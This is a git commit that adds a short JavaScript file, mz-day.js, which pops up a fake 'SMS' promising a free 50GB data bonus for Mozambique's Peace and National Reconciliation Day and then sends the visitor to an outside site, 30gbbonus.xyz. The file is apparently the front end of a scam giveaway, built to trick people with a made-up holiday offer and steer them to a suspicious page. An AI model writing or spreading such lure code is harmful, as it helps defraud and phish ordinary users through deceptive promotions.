7805d91c58e028054c5856c865f25665896febad
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-10-04 00:03:41 -0700

    Create mz-day.js

---
+++ mz-day.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 50GB'
+password=prompt('SMS: Hello, Your Peace and National Reconciliation Day offer is awaiting. Kindly Press Ok to Claim now before October 30th ','CLAIM 50GB ');
+if (password != 'CLAIM 50GB ') {
+location.href='https://30gbbonus.xyz/mozambique-50gb.html';
+}
